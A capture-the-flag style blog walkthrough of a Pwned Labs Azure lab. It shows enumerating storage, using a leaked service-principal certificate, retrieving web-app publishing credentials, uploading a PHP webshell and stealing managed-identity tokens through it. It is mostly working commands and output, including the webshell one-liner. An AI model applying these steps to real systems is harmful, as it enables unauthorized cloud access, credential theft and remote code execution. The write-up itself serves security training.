---
title: Passwordless Credentials for Access and Escalation
description: Passwordless Credentials for Access and Escalation
image:
  path: azure.webp
categories:
- Pwned Labs
- Azure
layout: post
media_subpath: /assets/posts/labs/pwnedlabs/azure/
tags:
- pwnedlabs
- azure
- cloud
---
# Scenario
On a red team engagement for our new client, Mega Big Tech, we have a mission to try and infiltrate their Azure environment and access sensitive data. Let's show what we can do!

Mega Big Tech will begin rolling out their own External Authentication Provider to reduce yearly operating costs. However, threat actors have already compromised the custom provider and altered its configuration. As a result, any Multifactor Authentication (MFA) challenge will now automatically return as successful, ultimately satisfying any Conditional Access Policy (CAP) that requires the standalone-MFA grant control (as opposed to the Authentication Strength-MFA grant control).

# Walkthrough
We can start with searching for Tenant ID. It can be done via [https://aadinternals.com/osint/](https://aadinternals.com/osint/) using domain name. The same can be done using Powershell AaInternals module
```
└─PS> Invoke-AADIntReconAsOutsider -DomainName megabigtech.com               
Tenant brand:       Default Directory                                                                                   
Tenant name:                                                                                                            
Tenant id:          2590ccef-687d-493b-ae8d-441cbab63a72                                                                
Tenant region:      EU                                                                                                  
DesktopSSO enabled: True                                                                                                
Get-TenantSubscope: /home/kali/.local/share/powershell/Modules/AADInternals/0.9.8/KillChain_utils.ps1:266               
Line |                                                                                                                  
 266 |  …            $SubScope = Get-TenantSubscope -Domain $User.Split("@")[1]                                         
     |                                                      ~~~~~~~~~~~~~~~~~~~                                         
     | Cannot bind argument to parameter 'Domain' because it is an empty string.                                        
WARNING: Requests throttled!                                                                                            
                                                                                                                        
Name    : megabigtech.com                                                                                               
DNS     : False                                                                                                         
MX      : False                                                                                                         
SPF     : False                                                                                                         
DMARC   :                                                                                                               
DKIM    : False                                                                                                         
MTA-STS : False                                                                                                         
Type    : Managed                                                                                                       
STS     :       
```

It's possible that users have emails on Microsoft or custom domains. We can try to compile a list of employees from LinkedIn and create a user list, then try to find out the email format. This would allow us to try spraying common passwords.

Alternatively we could look to brute force Azure subdomains that are used by various services or names used by storage accounts. We can use [AzSubEnum](https://github.com/yuyudhn/AzSubEnum), which allows us to enumerate Azure storage accounts and containers that might belong to the company (need to verify ownership)
```
└─$ python3 azsubenum.py -b megabigtech -t 10 -p permutations.txt

Discovered Subdomains:

Storage Accounts - Tables:
------------------------------------------------
megabigtechinternal.table.core.windows.net      
megabigtechconf.table.core.windows.net          

App Services - Management:
-----------------------------------------------
megabigtech-qa.scm.azurewebsites.net           
megabigtech-dev.scm.azurewebsites.net          
megabigtech-staging.scm.azurewebsites.net      
megabigtech.scm.azurewebsites.net              

App Services:
-------------------------------------------
megabigtech-staging.azurewebsites.net      
megabigtech.azurewebsites.net              
megabigtech-dev.azurewebsites.net          
megabigtech-qa.azurewebsites.net           

Storage Accounts - Queues:
------------------------------------------------
megabigtechconf.queue.core.windows.net          
megabigtechinternal.queue.core.windows.net      

Storage Accounts - Files:
-----------------------------------------------
megabigtechconf.file.core.windows.net          
megabigtechinternal.file.core.windows.net      

Storage Accounts - Blobs:
-----------------------------------------------
megabigtechinternal.blob.core.windows.net      
megabigtechconf.blob.core.windows.net       
```

We found two storage accounts containing `megabigtech`. Let's check `megabigtechinternal` storage account. We can try to identify blob containers in the storage account using [basicblobfinder](https://github.com/joswr1ght/basicblobfinder).
```
└─$ for word in $(cat ../AzSubEnum/permutations.txt); do echo megabigtechinternal:$word >> namelist; done
```
```
└─$ python3 basicblobfinder.py namelist
/home/kali/tools/cloud/azure/basicblobfinder/basicblobfinder.py:57: SyntaxWarning: invalid escape sequence '\-'
  if (re.search("[^a-z0-9\-]", cntrname) or "--" in cntrname or len(cntrname) < 3 or len(cntrname) > 63):
<SNIP>
Invalid container name $root, skipping.
Invalid container name $web, skipping.

Valid storage account and container name: megabigtechinternal:data
Blob data objects:
    https://megabigtechinternal.blob.core.windows.net/data/ApplicationIDs.csv
    https://megabigtechinternal.blob.core.windows.net/data/sp.pfx
<SNIP>
```
We found the container named data and the files `ApplicationIDs.csv` and `sp.pfx`. We can also list the contents of the data container via the URL: [https://megabigtechinternal.blob.core.windows.net/data?restype=container&comp=list](https://megabigtechinternal.blob.core.windows.net/data?restype=container&comp=list)
```
└─$ curl -s 'https://megabigtechinternal.blob.core.windows.net/data?restype=container&comp=list' | xq 
<?xml version="1.0" encoding="utf-8"?>
<EnumerationResults ContainerName="https://megabigtechinternal.blob.core.windows.net/data">
  <Blobs>
    <Blob>
      <Name>ApplicationIDs.csv</Name>
      <Url>https://megabigtechinternal.blob.core.windows.net/data/ApplicationIDs.csv</Url>
      <Properties>
        <Last-Modified>Mon, 15 Apr 2024 19:31:49 GMT</Last-Modified>
        <Etag>0x8DC5D82B2193E7D</Etag>
        <Content-Length>3636</Content-Length>
        <Content-Type>text/csv</Content-Type>
        <Content-Encoding/>
        <Content-Language/>
        <Content-MD5>b/VVz8vGquAc5cZAfAPDsg==</Content-MD5>
        <Cache-Control/>
        <BlobType>BlockBlob</BlobType>
        <LeaseStatus>unlocked</LeaseStatus>
      </Properties>
    </Blob>
    <Blob>
      <Name>sp.pfx</Name>
      <Url>https://megabigtechinternal.blob.core.windows.net/data/sp.pfx</Url>
      <Properties>
        <Last-Modified>Mon, 15 Apr 2024 14:23:35 GMT</Last-Modified>
        <Etag>0x8DC5D57A2A2E574</Etag>
        <Content-Length>2558</Content-Length>
        <Content-Type>application/x-pkcs12</Content-Type>
        <Content-Encoding/>
        <Content-Language/>
        <Content-MD5>hU6L74KUyOePe8MDfCt6fw==</Content-MD5>
        <Cache-Control/>
        <BlobType>BlockBlob</BlobType>
        <LeaseStatus>unlocked</LeaseStatus>
      </Properties>
    </Blob>
  </Blobs>
  <NextMarker/>
</EnumerationResults>
```
The contents of `ApplicationIDs.csv` contains properties of applications that are used in the Azure environment.
```
└─$ cat ApplicationIDs.csv 
"AppId","DisplayName","SignInAudience"
"92eae7c0-6598-441e-b349-3c03dc74455d","MSP-Connector-App-tkbam","AzureADandPersonalMicrosoftAccount"
"f0d81607-97e6-4976-ac3c-2d5a273695eb","DEV-Azure-Function-prod","AzureADandPersonalMicrosoftAccount"
"378ac9d7-056c-49d7-8ea0-e86250e1fb9a","megabigtech-dev","AzureADMyOrg"
"d2fbe72d-dd3e-4073-85c2-938b25623aa1","MSP-Connector-App-prod1","AzureADandPersonalMicrosoftAccount"
"012da277-3879-412c-8cb5-ed41a13a9197","SpMailHelper","AzureADandPersonalMicrosoftAccount"
"6d921ff5-9388-4f56-910a-71c302f94599","DEV-Azure-Function-dnqis","AzureADandPersonalMicrosoftAccount"
"b1246fc1-17c1-494d-afaf-30ae5ae53cbf","MSP-Connector-App-xsmed","AzureADandPersonalMicrosoftAccount"
"78cba46b-6a64-4e27-aaf4-acb9291a43fb","MSP-Connector-App-prd","AzureADandPersonalMicrosoftAccount"
"7f2c8666-2289-43ce-a721-a4290d028120","DEV-Azure-Function-prod","AzureADandPersonalMicrosoftAccount"
"5504310f-c353-4bca-aea4-407f1a83dea5","MSP-Connector-App-prd2","AzureADandPersonalMicrosoftAccount"
"c51e4baa-f0a7-4463-b79e-0a59efa2149c","RTHVTYCSRJ","AzureADMyOrg"
"4f3f10cc-5ed4-4bb4-8247-e953075517bb","P2P Server","AzureADMyOrg"
"9f6ae195-fd13-49d4-9845-54aa2f8194c7","testspn","AzureADMyOrg"
"d913535b-0b7e-46e5-9e5c-c5e10394a173","DEV-Azure-Function-qwoux","AzureADandPersonalMicrosoftAccount"
"20acc5dd-ffd4-41ac-a1a5-d381329da49a","HrPortal","AzureADMyOrg"
"e03d5f34-86d6-452b-b96f-96ff6c63f130","RTHVTYCSRJ","AzureADMyOrg"
"15f0ecf1-86ab-4431-a1c4-1926dfe9f832","DEV-Azure-Function-qaedj","AzureADandPersonalMicrosoftAccount"
"bd726d20-7155-4950-b28a-6989aee839e8","MSP-Connector-App-prod","AzureADandPersonalMicrosoftAccount"
"678200a8-209e-4bb4-afc7-2d2bad47fddd","DEV-Azure-Function-xsmed","AzureADandPersonalMicrosoftAccount"
"40b53c62-c244-44b8-b202-a27d5d1ca2fe","MSP-Connector-App-prod","AzureADandPersonalMicrosoftAccount"
"da0d1b55-d008-4567-bc2b-fee4ea181c3a","DEV-Azure-Function-prd2","AzureADandPersonalMicrosoftAccount"
"7ddf4787-e8da-46ea-830d-5d571ec32dd2","it-helpdesk-app","AzureADMyOrg"
"3626d80c-9f3b-48f9-a445-65a1ad9129af","daiki-appspn","AzureADMyOrg"
"49e7d4bc-d278-464c-aec7-cc2ab9f44b0a","DEV-Azure-Function-rxodt","AzureADandPersonalMicrosoftAccount"
"1c3a36c3-ea33-43c4-a48a-3278ccf91e34","MSP-Connector-App-prod","AzureADandPersonalMicrosoftAccount"
"fa355496-9020-408c-93cd-4fe35a2fed23","MSP-Connector-App-dnqis","AzureADandPersonalMicrosoftAccount"
"46db7f41-1dd1-4633-872d-012b02c52888","DEV-Azure-Function-tkbam","AzureADandPersonalMicrosoftAccount"
"f3178b98-0f72-4159-b013-0dc7a595ac72","DEV-Azure-Function-prod2","AzureADandPersonalMicrosoftAccount"
"4d25096b-3673-48d0-bf20-5da39d883436","EmailRead","AzureADMyOrg"
"2dea6aa6-7c26-4d3b-9be2-c4fddf3e3a28","MSP-Connector-App-prod2","AzureADandPersonalMicrosoftAccount"
"ba137b21-881e-4ae4-aab6-8aff268fc12c","MSP-Connector-App-qaedj","AzureADandPersonalMicrosoftAccount"
"82cf9fd8-fba9-4b25-b577-38e90437d2b7","DEV-Azure-Function-prd","AzureADandPersonalMicrosoftAccount"
"2535bbc8-5706-4e59-a075-d8d3a8182127","DEV-Azure-Function-prod","AzureADandPersonalMicrosoftAccount"
"f7b31ce5-6e5d-4821-9ab1-68c720b51ff6","DEV-Azure-Function-nlrig","AzureADandPersonalMicrosoftAccount"
"a804084f-a18f-4464-890b-08a8cb04eb21","DEV-Azure-Function-prod1","AzureADandPersonalMicrosoftAccount"
"7743dae0-323a-4679-adb2-cce4b137d0de","MSP-Connector-App-rxodt","AzureADandPersonalMicrosoftAccount"
"e0084e0b-95a2-433d-8f62-df26d6e9ab83","MSP-Connector-App-qwoux","AzureADandPersonalMicrosoftAccount"
"546459a5-e97d-429a-967d-b8a59a476b3e","MSP-Connector-App-nlrig","AzureADandPersonalMicrosoftAccount"

```

A PFX file is a binary file designed to encapsulate multiple cryptographic components, potentially comprising of private keys, public keys, and digital certificates. The` Get-PfxCertificate` cmdlet shows that it was created for the `HrPortal` and it seems it's not protected with a password.
```
└─PS> Get-PfxCertificate -FilePath "sp.pfx" | fl                                                                                                                                                                                            

Subject      : CN=HrPortal
Issuer       : CN=HrPortal
Thumbprint   : 8641763A94ED35C77DBA10E5A302DDDE29EE6769
FriendlyName : 
NotBefore    : 4/14/2024 2:07:18 AM
NotAfter     : 1/1/2100 2:07:18 AM
Extensions   : {System.Security.Cryptography.Oid, System.Security.Cryptography.Oid, System.Security.Cryptography.Oid}
```
We saw `HrPortal` in `csv` file 
```
└─$ cat ApplicationIDs.csv 
<SNIP>
"20acc5dd-ffd4-41ac-a1a5-d381329da49a","HrPortal","AzureADMyOrg"
<SNIP>
```
We usually authenticate as a service principal associated with an Azure application using an ID and secret (password). However it's also possible to authenticate using certificates rather than secrets.

When authenticaiton on Windows, we have to add the certificate to local certificate store
```
Get-ChildItem -Path sp.pfx | Import-PfxCertificate -CertStoreLocation Cert:\CurrentUser\My -Exportable
```
Then authenticate as the service principal using the tenant Id and the client ID associated with the `HrPortal`
```
$tenantId = "2590ccef-687d-493b-ae8d-441cbab63a72"
$clientId = "20acc5dd-ffd4-41ac-a1a5-d381329da49a"
$certThumbprint = "8641763A94ED35C77DBA10E5A302DDDE29EE6769"

$store = New-Object System.Security.Cryptography.X509Certificates.X509Store("My", "CurrentUser")
$store.Open([System.Security.Cryptography.X509Certificates.OpenFlags]::ReadOnly)
$cert = $store.Certificates.Find([System.Security.Cryptography.X509Certificates.X509FindType]::FindByThumbprint, $certThumbprint, $false)[0]
$store.Close()

Connect-AzAccount -CertificateThumbprint $certThumbprint -ApplicationId $clientId -TenantId $tenantId -ServicePrincipal
```

From Linux, first convert the PFX to a PEM, as the Az CLI requires it to authenticate. We can do this using OpenSSL. When it prompts for a password, just press enter without setting any password
```
└─$ openssl pkcs12 -in sp.pfx -out sp.pem -nodes -clcerts
Enter Import Password:
```
Using the application ID (service principal) and the tenant ID, we can now log in using Az CLI.
```
└─$ az login --service-principal -u "20acc5dd-ffd4-41ac-a1a5-d381329da49a" --certificate sp.pem --tenant "2590ccef-687d-493b-ae8d-441cbab63a72"
[
  {
    "cloudName": "AzureCloud",
    "homeTenantId": "2590ccef-687d-493b-ae8d-441cbab63a72",
    "id": "ceff06cb-e29d-4486-a3ae-eaaec5689f94",
    "isDefault": true,
    "managedByTenants": [],
    "name": "Microsoft Azure Sponsorship",
    "state": "Enabled",
    "tenantId": "2590ccef-687d-493b-ae8d-441cbab63a72",
    "user": {
      "name": "20acc5dd-ffd4-41ac-a1a5-d381329da49a",
      "type": "servicePrincipal"
    }
  }
]
```
> When not using latest version of the Azure CLI, use the `-p` (password) parameter instead of `--certificate`).
{: .prompt-info }
```
az login --service-principal -u "20acc5dd-ffd4-41ac-a1a5-d381329da49a" -p sp.pem --tenant "2590ccef-687d-493b-ae8d-441cbab63a72"
```
We can now get the access token and use it to authenticate with other tools
```
└─$ az account get-access-token
{
  "accessToken": "<REDACTED>",
  "expiresOn": "2025-09-21 14:43:09.000000",
  "expires_on": 1758444189,
  "subscription": "ceff06cb-e29d-4486-a3ae-eaaec5689f94",
  "tenant": "2590ccef-687d-493b-ae8d-441cbab63a72",
  "tokenType": "Bearer"
}
```

Now authenticate using Powershell Az module with the token
```
└─PS> Connect-AzAccount -AccountId "20acc5dd-ffd4-41ac-a1a5-d381329da49a" -AccessToken "<REDACTED>"

Subscription name           Tenant
-----------------           ------
Microsoft Azure Sponsorship 2590ccef-687d-493b-ae8d-441cbab63a72
```

We find Azure Web App named `megabigtech-hr-portal`. We also see the subscription ID and a resource group named `mbt-rg-12`.
```
└─PS>  Get-AzResource                                                            

Name              : megabigtech-hr-portal
ResourceGroupName : mbt-rg-12
ResourceType      : Microsoft.Web/sites
Location          : eastus2
ResourceId        : /subscriptions/ceff06cb-e29d-4486-a3ae-eaaec5689f94/resourceGroups/mbt-rg-12/providers/Microsoft.Web/sites/megabigtech-hr-portal
Tags              : 

```

The `Get-AzRoleAssignment` cmdlet shows that our compromised service principal has been granted the Website Contributor role on the web app. This powerful role also provides access to the "Kudu" / SCM or advanced site. Each app in Azure also has a corresponding Kudu site that allows admins to manage and access the file system and other aspects. The issue for us is that service principals are intended for programmatic access only and so we wouldn't be able to login to the site with our compromised account.
```
└─PS> $roleAssignments = Get-AzRoleAssignment
```
```
└─PS> $roleAssignments

RoleAssignmentName : dca610a0-90fa-48ba-8c15-b5c92a4db0a8
RoleAssignmentId   : /subscriptions/ceff06cb-e29d-4486-a3ae-eaaec5689f94/resourceGroups/mbt-rg-12/providers/Microsoft.Web/sites/megabigtech-hr-portal/providers/Microsoft.Authorization/roleAssignments/dca610a0-90fa-48ba-8c15-b5c92a4db0a
                     8
Scope              : /subscriptions/ceff06cb-e29d-4486-a3ae-eaaec5689f94/resourceGroups/mbt-rg-12/providers/Microsoft.Web/sites/megabigtech-hr-portal
DisplayName        : 
SignInName         : 
RoleDefinitionName : Website Contributor
RoleDefinitionId   : de139f84-1756-47ae-9be6-808fbbe84772
ObjectId           : eb7afacb-53ba-4fda-9dbe-c0cc9d6b386c
ObjectType         : ServicePrincipal
CanDelegate        : False
Description        : 
ConditionVersion   : 
Condition          : 
```

In the cloud there is feature parity between console and command-line operations. We can achieve the same level of access uisng the CLI. But first, let's find out if we're dealing with a Windows or Linux
```
└─$ curl -I --silent 'https://megabigtech-hr-portal.azurewebsites.net'
HTTP/1.1 200 OK
Content-Length: 4554
Content-Type: text/html
Date: Sun, 21 Sep 2025 08:06:28 GMT
Server: nginx/1.28.0
Accept-Ranges: bytes
ETag: "68bfeba6-11ca"
Last-Modified: Tue, 09 Sep 2025 08:56:06 GMT
```

The curl command reveals that the server is Nginx, which only runs on Linux. Let's fuzz to find the content hosted on the app
```
└─$ ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt -u https://megabigtech-hr-portal.azurewebsites.net/FUZZ   

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : https://megabigtech-hr-portal.azurewebsites.net/FUZZ
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

# on at least 3 different hosts [Status: 200, Size: 4554, Words: 1409, Lines: 90, Duration: 259ms]
# directory-list-2.3-small.txt [Status: 200, Size: 4554, Words: 1409, Lines: 90, Duration: 270ms]
# This work is licensed under the Creative Commons [Status: 200, Size: 4554, Words: 1409, Lines: 90, Duration: 269ms]
#                       [Status: 200, Size: 4554, Words: 1409, Lines: 90, Duration: 261ms]
# license, visit http://creativecommons.org/licenses/by-sa/3.0/ [Status: 200, Size: 4554, Words: 1409, Lines: 90, Duration: 267ms]
#                       [Status: 200, Size: 4554, Words: 1409, Lines: 90, Duration: 235ms]
#                       [Status: 200, Size: 4554, Words: 1409, Lines: 90, Duration: 231ms]
# Suite 300, San Francisco, California, 94105, USA. [Status: 200, Size: 4554, Words: 1409, Lines: 90, Duration: 255ms]
# Priority-ordered case-sensitive list, where entries were found [Status: 200, Size: 4554, Words: 1409, Lines: 90, Duration: 249ms]
#                       [Status: 200, Size: 4554, Words: 1409, Lines: 90, Duration: 258ms]
# Copyright 2007 James Fisher [Status: 200, Size: 4554, Words: 1409, Lines: 90, Duration: 259ms]
# Attribution-Share Alike 3.0 License. To view a copy of this [Status: 200, Size: 4554, Words: 1409, Lines: 90, Duration: 208ms]
# or send a letter to Creative Commons, 171 Second Street, [Status: 200, Size: 4554, Words: 1409, Lines: 90, Duration: 208ms]
                        [Status: 200, Size: 4554, Words: 1409, Lines: 90, Duration: 220ms]
portal                  [Status: 301, Size: 169, Words: 5, Lines: 8, Duration: 265ms]
```
We found `portal` directory. 

![](passwordless-credentials-for-access-and-escalation-1.png)


The Website Contributor role would also allow us to access the web app's publishing profile that contains the credentials used to deploy resources to the site. Azure App Service offers FTPS (FTP over SSL/TLS) for deploying and managing web app’s files. 

Let's retrieve the site configuration of the Web App. We see the setting `FtpsState: FtpsOnly`, indicating that only `FTPS` is allowed. The `PublishingUsername` is set to`$megabigtech-hr-portal`. We need to use this with the publishing password when connecting over `FTPS` or to the `Kudu VFS API`
```
└─PS> (Get-AzWebApp -ResourceGroupName 'mbt-rg-12' -Name 'megabigtech-hr-portal').SiteConfig                                                                                                                                                
NumberOfWorkers                        : 1
DefaultDocuments                       : {Default.htm, Default.html, Default.asp, index.htm…}
NetFrameworkVersion                    : v4.0
PhpVersion                             : 
PythonVersion                          : 
NodeVersion                            : 
PowerShellVersion                      :                                                                                                                                                                                                    
LinuxFxVersion                         : PHP|8.2
WindowsFxVersion                       : 
RequestTracingEnabled                  : False
RequestTracingExpirationTime           : 
RemoteDebuggingEnabled                 : False
RemoteDebuggingVersion                 : 
HttpLoggingEnabled                     : False
AcrUseManagedIdentityCreds             : 
AcrUserManagedIdentityID               : 
LogsDirectorySizeLimit                 : 35
DetailedErrorLoggingEnabled            : False
PublishingUsername                     : $megabigtech-hr-portal
AppSettings                            : {MICROSOFT_PROVIDER_AUTHENTICATION_SECRET, WEBJOBS_SHOULD_RUN, WEBSITE_AUTH_AAD_ALLOWED_TENANTS, WEBSITES_ENABLE_APP_SERVICE_STORAGE}
ConnectionStrings                      : {}
MachineKey                             : 
HandlerMappings                        : 
DocumentRoot                           : 
ScmType                                : None
Use32BitWorkerProcess                  : True
WebSocketsEnabled                      : False
AlwaysOn                               : True
JavaVersion                            : 
JavaContainer                          : 
JavaContainerVersion                   : 
AppCommandLine                         : 
ManagedPipelineMode                    : Integrated
VirtualApplications                    : {Microsoft.Azure.Management.WebSites.Models.VirtualApplication}
LoadBalancing                          : LeastRequests
Experiments                            : Microsoft.Azure.Management.WebSites.Models.Experiments
Limits                                 : 
AutoHealEnabled                        : False
AutoHealRules                          : 
TracingOptions                         : 
VnetName                               : 
VnetRouteAllEnabled                    : False
VnetPrivatePortsCount                  : 
Cors                                   : 
Push                                   : 
ApiDefinition                          : 
ApiManagementConfig                    : 
AutoSwapSlotName                       : 
LocalMySqlEnabled                      : False
ManagedServiceIdentityId               : 21063
XManagedServiceIdentityId              : 
KeyVaultReferenceIdentity              : 
IpSecurityRestrictions                 : {Allow VPN, , Deny all}
ScmIpSecurityRestrictions              : {Deny all}
ScmIpSecurityRestrictionsUseMain       : True
Http20Enabled                          : False
MinTlsVersion                          : 1.2
ScmMinTlsVersion                       : 
FtpsState                              : FtpsOnly
PreWarmedInstanceCount                 : 
FunctionAppScaleLimit                  : 
HealthCheckPath                        : 
FunctionsRuntimeScaleMonitoringEnabled : 
WebsiteTimeZone                        : 
MinimumElasticInstanceCount            : 
AzureStorageAccounts                   : 
PublicNetworkAccess                    : 

```

We can retrieve the FTPS deployment URL, username and password with the commands below
```
$webAppName = "megabigtech-hr-portal"
$resourceGroupName = "mbt-rg-12"

$publishingProfileXml = [xml](Get-AzWebAppPublishingProfile -Name $webAppName -ResourceGroupName $resourceGroupName -OutputFile null)

$username = $publishingProfileXml.SelectSingleNode("//publishData/publishProfile[@publishMethod='MSDeploy']").userName
$password = $publishingProfileXml.SelectSingleNode("//publishData/publishProfile[@publishMethod='MSDeploy']").userPWD
$ftpsProfile = $publishingProfileXml.SelectSingleNode("//publishData/publishProfile[@publishMethod='FTP']")
$ftpsUrl = $ftpsProfile.publishUrl

$username
$password
$ftpsUrl
```
Let's run it
```
└─PS> $username
$megabigtech-hr-portal
```
```
┌──(kali㉿kali)-[/home/kali/pwnedlabs/azure]
└─PS> $password
<REDACTED>
```
```
┌──(kali㉿kali)-[/home/kali/pwnedlabs/azure]
└─PS> $ftpsUrl
ftps://waws-prod-bn1-159.ftp.azurewebsites.windows.net/site/wwwroot
```

We can try to upload a PHP webshell like the one below that gives us command execution on the web app.
```
<?php echo system($_GET["cmd"]); ?>
```
```
└─PS> curl -T shell.php --ssl ftps://waws-prod-bn1-159.ftp.azurewebsites.windows.net/site/wwwroot/portal/shell.php --user '$megabigtech-hr-portal'
Warning: --ssl is an insecure option, consider --ssl-reqd instead
Enter host password for user '$megabigtech-hr-portal':
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100    36    0     0  100    36      0      4  0:00:09  0:00:08  0:00:01     0
```

![](passwordless-credentials-for-access-and-escalation-2.png)

Distributed cloud resources often have the need to interact with other resources in Azure and can be configured with a user or system-managed identity that allows them to authenticate. An API endpoint is accessible on a private (non-internet routable) IP address that allows the application to retrieve a token for the managed identity and interact with Azure. The API endpoint URL is like the example below, with the last two octets of the IP address rotating periodically. Since we know that this is Linux, let's retrieve environment variables
```
http://169.254.129.5:8081/msi/token
```
```
└─$ curl --silent 'https://megabigtech-hr-portal.azurewebsites.net/portal/shell.php?cmd=env'   
WEBSITE_DEFAULT_HOSTNAME=megabigtech-hr-portal.azurewebsites.net
WEBSITES_ENABLE_APP_SERVICE_STORAGE=true
PHP_EXTRA_CONFIGURE_ARGS=--enable-fpm --with-fpm-user=www-data --with-fpm-group=www-data --disable-cgi ac_cv_func_mmap=no
LANGUAGE=C.UTF-8
WEBJOB_HOME=/home
FUNCTIONS_RUNTIME_SCALE_MONITORING_ENABLED=0
USER=www-data
APPSETTING_WEBSITE_DEFAULT_HOSTNAME=megabigtech-hr-portal.azurewebsites.net
REGION_NAME=eastus2
PLATFORM_VERSION=105.0.7.111
HOSTNAME=7896d62b7aea
PHP_INI_DIR=/usr/local/etc/php
WEBSITE_INSTANCE_ID=99d74da325fb16af8e7626755ad77ed17111f16fb2cadf11bb6f1b64dd14ba76
APPSETTING_FUNCTIONS_RUNTIME_SCALE_MONITORING_ENABLED=0
APPSETTING_WEBSITES_ENABLE_APP_SERVICE_STORAGE=true
IDENTITY_HEADER=53f36c7c-66eb-4f42-ace3-e568fe465796
<SNIP>
IDENTITY_ENDPOINT=http://169.254.129.4:8081/msi/token
<SNIP>
```

We only need the following header and endpoint variablesto construct our request (existence of these variables confirms that a managed identity has been configured)
```
IDENTITY_HEADER=559e4333-f593-4735-8684-9742cc817930
IDENTITY_ENDPOINT=http://169.254.129.5:8081/msi/token
```

Request the token
```
└─$ curl --silent 'https://megabigtech-hr-portal.azurewebsites.net/portal/shell.php?cmd=curl%20-s%20-H%20%22X-Identity-Header%3A%20%24IDENTITY_HEADER%22%20%22%24IDENTITY_ENDPOINT%3Fapi-version%3D2019-08-01%26resource%3Dhttps%3A%2F%2Fmanagement.azure.com%2F%22'
{"access_token":"<REDACTED>","expires_on":"1758530571","resource":"https://management.azure.com/","token_type":"Bearer","client_id":"6beb3ab0-6e28-4a92-8e5a-ce0d5abf3a8c"}
```

![](passwordless-credentials-for-access-and-escalation-3.png)

We also need subscription ID, which can be retrieved with `Get-AzRoleAssignment`, but in case we have no access, we can get it from `WEBSITE_OWNER_NAME` variable.
```
└─$ curl --silent 'https://megabigtech-hr-portal.azurewebsites.net/portal/shell.php?cmd=env'   
WEBSITE_DEFAULT_HOSTNAME=megabigtech-hr-portal.azurewebsites.net
<SNIP>
WEBSITE_OWNER_NAME=ceff06cb-e29d-4486-a3ae-eaaec5689f94+mbt-rg-12-EastUS2webspace-Linux
<SNIP>
```

Now we can craft a script  to identify the resources we can access.
```
$subscriptionId = "ceff06cb-e29d-4486-a3ae-eaaec5689f94"

# Azure Management API URL to list resources
$url = "https://management.azure.com/subscriptions/$subscriptionId/resources?api-version=2021-04-01"

# Headers with the access token for authorization
$headers = @{
    Authorization = "Bearer $token"
    "Content-Type" = "application/json"
}

try {
    $response = Invoke-RestMethod -Uri $url -Method Get -Headers $headers
    $resources = $response.value
    # Output the resources
    $resources | ForEach-Object {
        Write-Output "Resource Name: $($_.name), Type: $($_.type), Location: $($_.location)"
    }
} catch {
    Write-Error "Failed to retrieve resources: $_"
}
```
Or use Powershel Az module with token we acquired
```
└─PS> Connect-AzAccount -AccessToken $token -AccountId b56cb3c4-c115-4e3a-9e35-5614a2a32c3c       

Subscription name           Tenant
-----------------           ------
Microsoft Azure Sponsorship 2590ccef-687d-493b-ae8d-441cbab63a72

```
```
└─PS> Get-AzResource                            

Name              : megabigtechinternal
ResourceGroupName : mbt-rg-12
ResourceType      : Microsoft.Storage/storageAccounts
Location          : eastus
ResourceId        : /subscriptions/ceff06cb-e29d-4486-a3ae-eaaec5689f94/resourceGroups/mbt-rg-12/providers/Microsoft.Storage/storageAccounts/megabigtechinternal
Tags              : 

Name              : megabigtech-hr-portal
ResourceGroupName : mbt-rg-12
ResourceType      : Microsoft.Web/serverFarms
Location          : eastus2
ResourceId        : /subscriptions/ceff06cb-e29d-4486-a3ae-eaaec5689f94/resourceGroups/mbt-rg-12/providers/Microsoft.Web/serverFarms/megabigtech-hr-portal
Tags              : 

Name              : megabigtech-hr-portal
ResourceGroupName : mbt-rg-12
ResourceType      : Microsoft.Web/sites
Location          : eastus2
ResourceId        : /subscriptions/ceff06cb-e29d-4486-a3ae-eaaec5689f94/resourceGroups/mbt-rg-12/providers/Microsoft.Web/sites/megabigtech-hr-portal
Tags              : 

```

Nothing interesting. Let's turn our attention instead to the Entra ID and the Graph API. Request an access token for MS Graph
```
└─$ curl --silent 'https://megabigtech-hr-portal.azurewebsites.net/portal/shell.php?cmd=curl%20-s%20-H%20%22X-Identity-Header%3A%20%24IDENTITY_HEADER%22%20%22%24IDENTITY_ENDPOINT%3Fapi-version%3D2019-08-01%26resource%3Dhttps%3A%2F%2Fgraph.microsoft.com%2F%22'
{"access_token":"<REDACTED>","expires_on":"1758531262","resource":"https://graph.microsoft.com/","token_type":"Bearer","client_id":"6beb3ab0-6e28-4a92-8e5a-ce0d5abf3a8c"}
```
So let's query administrative units that might have been configured. Administrative units enable the limitation of role permissions to specific segments of the organization that you define
```
$headers = @{
    Authorization = "Bearer $token"
    "Content-Type" = "application/json"
}

$graphUrl = "https://graph.microsoft.com/v1.0/directory/administrativeUnits"

try {
    $adminUnits = Invoke-RestMethod -Uri $graphUrl -Headers $headers -Method Get
    # Output the administrative units
    $adminUnits.value | ForEach-Object {
        Write-Output "ID: $($_.id) - Display Name: $($_.displayName)"
    }
} catch {
    Write-Error "Error accessing Microsoft Graph: $_"
}
```
The same can be done with Microsoft Graph PowerShell with token we acquired
```
└─PS> Connect-MgGraph -AccessToken ($token | ConvertTo-SecureString -AsPlainText -Force)
Welcome to Microsoft Graph!

Connected via userprovidedaccesstoken access using 6beb3ab0-6e28-4a92-8e5a-ce0d5abf3a8c
Readme: https://aka.ms/graph/sdk/powershell
SDK Docs: https://aka.ms/graph/sdk/powershell/docs
API Docs: https://aka.ms/graph/docs

NOTE: You can use the -NoWelcome parameter to suppress this message.
```
```
└─PS> Get-MgDirectoryAdministrativeUnit | fl
DeletedDateTime               : 
Description                   : Scope to manage the authentication settings for the users belonging to the project.
DisplayName                   : Megabigtech-UNIT1
Extensions                    : 
Id                            : 47e4803e-a5ef-4ebc-b967-691815870abd
